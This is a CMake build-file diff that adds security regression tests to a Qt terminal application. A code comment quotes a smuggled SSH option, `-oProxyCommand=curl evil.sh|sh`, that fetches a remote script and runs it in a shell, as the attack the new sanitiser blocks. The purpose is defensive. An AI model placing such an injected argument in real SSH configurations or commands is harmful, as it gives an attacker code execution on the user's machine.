@@ -398,6 +398,30 @@ if(ANTS_TESTS)
         LABELS "features;fast"
         TIMEOUT 10)
 
+    # claude_plan_mode_detection — asserts that plan-mode toggle events
+    # in the JSONL transcript are correctly read (field is `permissionMode`,
+    # not `mode`) and that planModeChanged(bool) fires on transition.
+    # Anchored to the real Claude Code v2.1.87 JSONL schema. See
+    # tests/features/claude_plan_mode_detection/spec.md.
+    add_executable(test_claude_plan_mode
+        tests/features/claude_plan_mode_detection/test_claude_plan_mode.cpp
+        src/claudeintegration.cpp
+    )
+    target_link_libraries(test_claude_plan_mode PRIVATE
+        Qt6::Core
+        Qt6::Gui
+        Qt6::Network
+        Qt6::Test
+    )
+    target_include_directories(test_claude_plan_mode PRIVATE src)
+    target_compile_options(test_claude_plan_mode PRIVATE
+        -Wall -Wextra -Wpedantic
+    )
+    add_test(NAME claude_plan_mode_detection COMMAND test_claude_plan_mode)
+    set_tests_properties(claude_plan_mode_detection PROPERTIES
+        LABELS "features;fast"
+        TIMEOUT 10)
+
     # allowlist_add — asserts (A) rule normalisation, (B) generalisation
     # across every shell splitter, (C) segment-aware subsumption,
     # (D) hook-path button retraction wiring (toolFinished +
@@ -414,6 +438,7 @@ if(ANTS_TESTS)
     add_executable(test_allowlist_add
         tests/features/allowlist_add/test_allowlist_add.cpp
         src/claudeallowlist.cpp
+        src/debuglog.cpp  # 0.7.12: allowlist logs parse-failure guard via ANTS_LOG
     )
     target_link_libraries(test_allowlist_add PRIVATE
         Qt6::Core
@@ -517,6 +542,7 @@ if(ANTS_TESTS)
         tests/features/tab_color/test_tab_color.cpp
         src/coloredtabbar.cpp
         src/config.cpp
+        src/debuglog.cpp  # 0.7.12: config.cpp logs load/save failures via ANTS_LOG
     )
     target_link_libraries(test_tab_color PRIVATE
         Qt6::Core
@@ -542,6 +568,7 @@ if(ANTS_TESTS)
     add_executable(test_session_persistence_default
         tests/features/session_persistence_default/test_session_persistence_default.cpp
         src/config.cpp
+        src/debuglog.cpp  # 0.7.12: config.cpp logs load/save failures via ANTS_LOG
     )
     target_link_libraries(test_session_persistence_default PRIVATE
         Qt6::Core
@@ -669,6 +696,56 @@ if(ANTS_TESTS)
     )
     add_test(NAME ssh_dash_host_rejected COMMAND test_ssh_dash_host_rejected)
     set_tests_properties(ssh_dash_host_rejected PROPERTIES
+        LABELS "features;fast"
+        TIMEOUT 10)
+
+    # ssh_extra_args_sanitize — asserts the 0.7.12 /indie-review fix that
+    # rejects ProxyCommand/LocalCommand/PermitLocalCommand from extraArgs.
+    # Without this filter a bookmark field carrying
+    # `-oProxyCommand=curl evil.sh|sh` hands OpenSSH an attacker-chosen
+    # shell command (executed via /bin/sh -c). See
+    # tests/features/ssh_extra_args_sanitize/spec.md.
+    add_executable(test_ssh_extra_args_sanitize
+        tests/features/ssh_extra_args_sanitize/test_ssh_extra_args.cpp
+        src/sshdialog.cpp
+    )
+    target_link_libraries(test_ssh_extra_args_sanitize PRIVATE
+        Qt6::Core
+        Qt6::Widgets
+    )
+    target_include_directories(test_ssh_extra_args_sanitize PRIVATE src)
+    target_compile_options(test_ssh_extra_args_sanitize PRIVATE
+        -Wall -Wextra -Wpedantic
+    )
+    add_test(NAME ssh_extra_args_sanitize COMMAND test_ssh_extra_args_sanitize)
+    set_tests_properties(ssh_extra_args_sanitize PROPERTIES
+        LABELS "features;fast"
+        TIMEOUT 10)
+
+    # ai_insert_command_sanitize — asserts the 0.7.12 /indie-review
+    # OWASP LLM01+LLM02 fix: AI-suggested commands pass through
+    # control-char strip + 4 KiB cap, AND the click handler gates the
+    # insertCommand emit on a user confirmation dialog. See
+    # tests/features/ai_insert_command_sanitize/spec.md.
+    add_executable(test_ai_insert_command_sanitize
+        tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp
+        src/aidialog.cpp
+    )
+    target_link_libraries(test_ai_insert_command_sanitize PRIVATE
+        Qt6::Core
+        Qt6::Gui
+        Qt6::Widgets
+        Qt6::Network
+    )
+    target_include_directories(test_ai_insert_command_sanitize PRIVATE src)
+    target_compile_options(test_ai_insert_command_sanitize PRIVATE
+        -Wall -Wextra -Wpedantic
+    )
+    target_compile_definitions(test_ai_insert_command_sanitize PRIVATE
+        SRC_AI_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/aidialog.cpp"
+    )
+    add_test(NAME ai_insert_command_sanitize COMMAND test_ai_insert_command_sanitize)
+    set_tests_properties(ai_insert_command_sanitize PROPERTIES
         LABELS "features;fast"
         TIMEOUT 10)
 
@@ -1382,6 +1459,56 @@ if(ANTS_TESTS)
     )
     add_test(NAME remote_control_send_text COMMAND test_remote_control_send_text)
     set_tests_properties(remote_control_send_text PROPERTIES
+        LABELS "features;fast"
+        TIMEOUT 10)
+
+    # remote_control_opt_in — asserts the 0.7.12 /indie-review hardening:
+    # (A) behavioral — filterControlChars strips the dangerous C0 subset +
+    #     DEL while preserving HT / LF / CR and UTF-8 bytes >= 0x80;
+    # (B) source-grep — cmdSendText consults raw-bypass + calls the
+    #     filter, MainWindow gates the listener on remoteControlEnabled().
+    # Closes the local-UID keystroke-injection RCE chain. See
+    # tests/features/remote_control_opt_in/spec.md.
+    add_executable(test_remote_control_opt_in
+        tests/features/remote_control_opt_in/test_remote_control_opt_in.cpp
+    )
+    target_link_libraries(test_remote_control_opt_in PRIVATE
+        Qt6::Core
+    )
+    target_include_directories(test_remote_control_opt_in PRIVATE src)
+    target_compile_options(test_remote_control_opt_in PRIVATE
+        -Wall -Wextra -Wpedantic
+    )
+    target_compile_definitions(test_remote_control_opt_in PRIVATE
+        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
+        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
+    )
+    add_test(NAME remote_control_opt_in COMMAND test_remote_control_opt_in)
+    set_tests_properties(remote_control_opt_in PROPERTIES
+        LABELS "features;fast"
+        TIMEOUT 10)
+
+    # config_parse_failure_guard — asserts the 0.7.12 /indie-review
+    # silent-data-loss fix in Config: on parse failure, the corrupt
+    # file is rotated aside and save() is suppressed so setters don't
+    # clobber the user's hand-fixable config. Also exercises the fresh-
+    # run + valid-file happy paths and the std::rename return check.
+    # See tests/features/config_parse_failure_guard/spec.md.
+    add_executable(test_config_parse_failure
+        tests/features/config_parse_failure_guard/test_config_parse_failure.cpp
+        src/config.cpp
+        src/debuglog.cpp
+    )
+    target_link_libraries(test_config_parse_failure PRIVATE
+        Qt6::Core
+        Qt6::Gui
+    )
+    target_include_directories(test_config_parse_failure PRIVATE src)
+    target_compile_options(test_config_parse_failure PRIVATE
+        -Wall -Wextra -Wpedantic
+    )
+    add_test(NAME config_parse_failure_guard COMMAND test_config_parse_failure)
+    set_tests_properties(config_parse_failure_guard PROPERTIES
         LABELS "features;fast"
         TIMEOUT 10)
 
